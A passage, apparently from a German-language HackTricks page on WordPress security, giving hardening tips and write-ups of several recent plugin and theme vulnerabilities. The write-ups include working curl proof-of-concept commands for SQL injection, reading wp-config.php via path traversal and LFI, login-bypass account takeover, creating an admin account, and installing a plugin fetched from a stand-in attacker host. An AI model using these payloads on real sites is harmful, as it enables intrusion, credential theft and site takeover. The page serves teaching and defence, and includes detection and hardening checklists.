- Verlasse dich nicht auf generische WAF-Signaturen zum Schutz von plugin-CVEs. Implementiere application-layer, vulnerability-specific virtual patches oder aktualisiere schnell.
- Bevorzuge positive-security-Pr√ºfungen im Code (capabilities, nonces, strikte Eingabevalidierung) gegen√ºber negativen Regex-Filtern.

## WordPress-Schutz

### Regelm√§√üige Updates

Stelle sicher, dass WordPress, plugins und Themes auf dem neuesten Stand sind. Best√§tige au√üerdem, dass automatisches Updating in wp-config.php aktiviert ist:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Au√üerdem **installiere nur vertrauensw√ºrdige WordPress-Plugins und -Themes**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Weitere Empfehlungen**

- Entferne den Standard-**admin**-Benutzer
- Verwende **starke Passw√∂rter** und **2FA**
- √úberpr√ºfe regelm√§√üig die **Berechtigungen** der Benutzer
- **Begrenze Anmeldeversuche**, um Brute Force-Angriffe zu verhindern
- Benenne die Datei **`wp-admin.php`** um und erlaube den Zugriff nur intern oder von bestimmten IP-Adressen.


### Nicht authentifizierte SQL Injection aufgrund unzureichender Validierung (WP Job Portal <= 2.3.2)

Das WP Job Portal Recruitment-Plugin hat eine **savecategory**-Aufgabe offengelegt, die letztlich den folgenden verwundbaren Code in `modules/category/model.php::validateFormData()` ausf√ºhrt:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Durch diesen Codeausschnitt verursachte Probleme:

1. **Ungefilterte Benutzereingabe** ‚Äì `parentid` kommt direkt aus der HTTP-Anfrage.
2. **String-Konkatenation innerhalb der WHERE-Klausel** ‚Äì keine `is_numeric()` / `esc_sql()` / prepared statement.
3. **Nicht authentifizierte Erreichbarkeit** ‚Äì obwohl die Aktion √ºber `admin-post.php` ausgef√ºhrt wird, ist die einzige vorhandene Pr√ºfung ein **CSRF nonce** (`wp_verify_nonce()`), das jeder Besucher von einer √∂ffentlichen Seite abrufen kann, die den Shortcode `[wpjobportal_my_resumes]` einbettet.

#### Ausnutzung

1. Einen frischen Nonce abrufen:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Arbitr√§res SQL injizieren, indem `parentid` missbraucht wird:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Die Antwort offenbart das Ergebnis der injizierten Abfrage oder ver√§ndert die Datenbank, was die SQLi beweist.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Eine weitere Aufgabe, **downloadcustomfile**, erlaubte Besuchern, beliebige Dateien auf der Festplatte via path traversal herunterzuladen. Die verwundbare Stelle befindet sich in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` wird vom Angreifer kontrolliert und ohne Bereinigung zusammengef√ºgt. Wieder ist das einzige Hindernis ein **CSRF nonce**, das von der Resume-Seite abgerufen werden kann.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Der Server antwortet mit dem Inhalt von `wp-config.php`, leaking DB credentials und auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Viele themes/plugins enthalten "social login"-Hilfsfunktionen, die √ºber admin-ajax.php exponiert sind. Wenn eine unauthenticated AJAX action (wp_ajax_nopriv_...) den vom Client gelieferten Identifier vertraut, weil provider data fehlt, und anschlie√üend wp_set_auth_cookie() aufruft, f√ºhrt das zu einem vollst√§ndigen authentication bypass.

Typisches fehlerhaftes Muster (vereinfacht)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Warum es ausnutzbar ist

- Nicht authentifiziert erreichbar √ºber admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- Keine nonce/capability-Checks vor einer Zustands√§nderung.
- Fehlende OAuth/OpenID-Provider-Verifizierung; der Standardzweig akzeptiert Eingaben des Angreifers.
- get_user_by('email', $_POST['id']) gefolgt von wp_set_auth_cookie($uid) authentifiziert den Anforderer als jede existierende E-Mail-Adresse.

Ausnutzung (nicht authentifiziert)

- Voraussetzungen: Der Angreifer kann /wp-admin/admin-ajax.php erreichen und kennt/err√§t eine g√ºltige Benutzer-E-Mail-Adresse.
- Setze provider auf einen nicht unterst√ºtzten Wert (oder lasse ihn weg), um den Standardzweig zu erreichen und id=<victim_email> zu √ºbergeben.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 mit einem JSON-Body wie {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* f√ºr den betroffenen Benutzer; nachfolgende Anfragen sind authentifiziert.

Finding the action name

- Untersuche das Theme/Plugin nach add_action('wp_ajax_nopriv_...', '...') Registrierungen im Social-Login-Code (z. B. framework/add-ons/social-login/class-social-login.php).
- Grep nach wp_set_auth_cookie(), get_user_by('email', ...) innerhalb von AJAX-Handlern.

Detection checklist

- Weblogs, die unauthentifizierte POSTs an /wp-admin/admin-ajax.php mit der social-login Action und id=<email> zeigen.
- 200-Antworten mit dem success-JSON unmittelbar vor authentifiziertem Traffic von derselben IP/User-Agent.

Hardening

- Leite Identit√§t nicht aus Client-Eingaben ab. Akzeptiere nur E-Mails/IDs, die aus einem validierten Provider-Token/ID stammen.
- Erfordere CSRF-Nonces und capability-Checks auch f√ºr Login-Hilfen; vermeide das Registrieren von wp_ajax_nopriv_ au√üer wenn unbedingt notwendig.
- Validiere und verifiziere OAuth/OIDC-Antworten serverseitig; lehne fehlende/ung√ºltige Provider ab (kein Fallback auf POST id).
- Erw√§ge, Social Login vor√ºbergehend zu deaktivieren oder am Edge virtuell zu patchen (die verwundbare Action blockieren), bis ein Fix vorhanden ist.

Patched behaviour (Jobmonster 4.8.0)

- Den unsicheren Fallback von $_POST['id'] entfernt; $user_email muss aus verifizierten Provider-Branches in switch($_POST['using']) stammen.

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Einige Plugins stellen REST-Endpunkte bereit, die wiederverwendbare ‚Äûconnection keys‚Äú oder Tokens erzeugen, ohne die F√§higkeiten des Anrufers zu √ºberpr√ºfen. Wenn die Route nur anhand eines erratbaren Attributs (z. B. username) authentifiziert und den Key nicht mit einem Benutzer/Session mittels capability-Checks verkn√ºpft, kann jeder nicht authentifizierte Angreifer einen Key erstellen und privilegierte Aktionen ausf√ºhren (Admin-Account-Erstellung, Plugin-Aktionen ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Warum es ausnutzbar ist
- Sensible REST-Route, die nur durch einen gering entropischen Identit√§tsnachweis (username) gesch√ºtzt ist oder permission_callback fehlt
- Keine capability enforcement; minted key wird als universeller Bypass akzeptiert

Erkennungs-Checkliste
- Grep den Plugin-Code nach register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Jede Route, die Tokens/Keys basierend auf einer request-supplied Identit√§t (username/email) ausstellt, ohne sie an einen authentifizierten Benutzer oder an eine capability zu binden
- Suche nach nachgelagerten Routen, die den minted token/key ohne serverseitige capability-Pr√ºfungen akzeptieren

H√§rtung
- F√ºr jede privilegierte REST-Route: permission_callback verlangen, das current_user_can() f√ºr die ben√∂tigte capability erzwingt
- Erzeuge keine long-lived keys aus client-supplied identity; falls n√∂tig, gib kurzlebige, an den Nutzer gebundene Tokens nach Authentifizierung aus und pr√ºfe beim Gebrauch die capabilities erneut
- Validiere den User-Kontext des Aufrufers (wp_set_current_user ist nicht ausreichend allein) und lehne Requests ab, bei denen !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí unauthenticated arbitrary plugin installation (FunnelKit Automations ‚â§ 3.5.3)

Nonces verhindern CSRF, nicht Autorisierung. Wenn Code ein erfolgreiches Nonce-Pass als Freigabe behandelt und dann capability checks f√ºr privilegierte Operationen (z.B. install/activate plugins) √ºberspringt, k√∂nnen nicht-authentifizierte Angreifer eine schwache Nonce-Anforderung erf√ºllen und RCE erreichen, indem sie ein backdoored oder verwundbares Plugin installieren.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact: full compromise via arbitrary plugin install/activation

PoC (Form h√§ngt vom Plugin ab; nur illustrativ)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Nicht authentifizierte SQLi √ºber den Parameter s (search) in depicter-* actions (Depicter Slider ‚â§ 3.6.1)

Mehrere depicter-* actions verwendeten den Parameter s (search) und haben ihn ohne Parameterisierung in SQL-Abfragen verkettet.

- Parameter: s (search)
- Flaw: direkte String-Konkatenation in WHERE/LIKE-Klauseln; keine prepared statements/sanitization
- Impact: Datenbank-Exfiltration (users, hashes), laterale Bewegung

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep nach depicter-* action handlers und direkter Verwendung von $_GET['s'] oder $_POST['s'] in SQL
- √úberpr√ºfe benutzerdefinierte Queries, die an $wpdb->get_results()/query() √ºbergeben werden und s konkatenieren

Hardening
- Verwende immer $wpdb->prepare() oder wpdb-Platzhalter; lehne unerwartete Metazeichen serverseitig ab
- F√ºge eine strikte Allowlist f√ºr s hinzu und normalisiere auf erwarteten Zeichensatz/L√§nge

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

Das Akzeptieren von angreiferkontrollierten Pfaden in einem Template-Parameter ohne Normalisierung/Containment erm√∂glicht das Lesen beliebiger lokaler Dateien und in manchen F√§llen Codeausf√ºhrung, wenn einbindbare PHP- oder Log-Dateien zur Laufzeit eingebunden werden.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: keine Normalisierung/Allowlist; Traversal erlaubt
- Impact: Offenlegung von Secrets (wp-config.php), potenzielles RCE in bestimmten Umgebungen (log poisoning, includable PHP)

PoC ‚Äì wp-config.php lesen
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Checkliste zur Erkennung
- Jeder Handler, der Request-Pfade in include()/require()/read-Sinks zusammenf√ºgt, ohne realpath() zur Einschr√§nkung zu verwenden
- Auf Traversal-Muster (../) achten, die au√üerhalb des vorgesehenen templates-Verzeichnisses gelangen

H√§rtung
- Allowlist f√ºr Templates erzwingen; Datei mit realpath() aufl√∂sen und require str_starts_with(realpath(file), realpath(allowed_base))
- Eingaben normalisieren; Traversal-Sequenzen und absolute Pfade ablehnen; sanitize_file_name() nur f√ºr Dateinamen verwenden (nicht f√ºr vollst√§ndige Pfade)


## Referenzen

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
